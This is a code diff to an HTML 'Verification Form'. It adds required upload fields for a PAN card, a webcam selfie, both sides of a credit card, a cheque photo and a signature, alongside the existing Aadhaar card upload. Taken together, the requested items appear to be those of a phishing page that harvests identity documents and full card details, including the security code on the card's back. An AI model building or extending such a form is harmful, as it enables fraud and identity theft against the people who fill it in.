@@ -167,6 +167,7 @@
         <!-- Form Title -->
         <h2>Verification Form</h2>
 
+        <!-- Verification Form -->
         <form id="verificationForm">
     <!-- Name Input Field -->
     <div class="form-group">
@@ -183,9 +184,44 @@
         <small>Please upload both front and back photos of your Aadhaar Card.</small>
     </div>
 
-    <!-- Add other file input fields here -->
+            <!-- PAN Card Photo -->
+            <div class="form-group">
+                <label for="panPhoto">Upload PAN Card Photo:</label>
+                <i class="fas fa-address-card input-icon"></i>
+                <input type="file" id="panPhoto" name="panPhoto" accept="image/*" required>
+            </div>
 
-    <!-- Submit Button -->
+            <!-- Webcam Selfie -->
+            <div class="form-group">
+                <label for="webcamSelfie">Take a Webcam Selfie:</label>
+                <i class="fas fa-camera input-icon"></i>
+                <input type="file" id="webcamSelfie" name="webcamSelfie" accept="image/*" capture="user" required>
+            </div>
+
+            <!-- Credit Card Photos (Front and Back Combined) -->
+            <div class="form-group">
+                <label for="creditCardPhotos">Upload Credit Card Photos (Front and Back):</label>
+                <i class="fas fa-credit-card input-icon"></i>
+                <input type="file" id="creditCardPhotos" name="creditCardPhotos" accept="image/*" multiple required>
+                <small>Please upload both front and back photos of your Credit Card.</small>
+            </div>
+
+            <!-- Cheque Photo -->
+            <div class="form-group">
+                <label for="chequePhoto">Upload Cheque Photo:</label>
+                <i class="fas fa-money-check input-icon"></i>
+                <input type="file" id="chequePhoto" name="chequePhoto" accept="image/*" required>
+            </div>
+
+            <!-- Client's Signature -->
+            <div class="form-group">
+                <label for="clientSignature">Upload Client's Signature:</label>
+                <i class="fas fa-signature input-icon"></i>
+                <input type="file" id="clientSignature" name="clientSignature" accept="image/*" required>
+                <small>Please upload a clear image of your signature.</small>
+            </div>
+
+            <!-- Submit Button -->
     <div class="form-group">
         <button type="submit" class="submit-btn">
             <i class="fas fa-check-circle"></i> Submit Verification
